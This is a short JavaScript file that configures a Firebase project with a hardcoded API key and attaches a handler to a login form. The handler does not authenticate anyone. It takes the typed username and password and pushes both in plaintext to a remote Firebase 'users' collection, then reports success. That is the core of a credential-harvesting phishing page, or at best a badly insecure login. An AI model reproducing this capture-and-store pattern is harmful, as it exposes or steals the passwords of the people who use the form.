// Your web app's Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyBZmmbbXdxPd_FAqjktaJgRzzOyHuhbgC0",
    authDomain: "githubproject-samir.firebaseapp.com",
    databaseURL: "https://githubproject-samir-default-rtdb.firebaseio.com",
    projectId: "githubproject-samir",
    storageBucket: "githubproject-samir.appspot.com",
    messagingSenderId: "693345685690",
    appId: "1:693345685690:web:c65f35d5c18d913a38f283",
    measurementId: "G-290YKQECBW"
  };
  
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  
// Get a reference to the database service
var database = firebase.database();

// Listen for form submission
document.getElementById("login-form").addEventListener("submit", function(event) {
  event.preventDefault(); // Prevent form from submitting

  // Get the form values
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  // Store the data in the Firebase database
  database.ref("users").push({
    username: username,
    password: password
  });

  // Clear the form
  document.getElementById("login-form").reset();

  // Display a success message
  alert("Data submitted successfully!");
});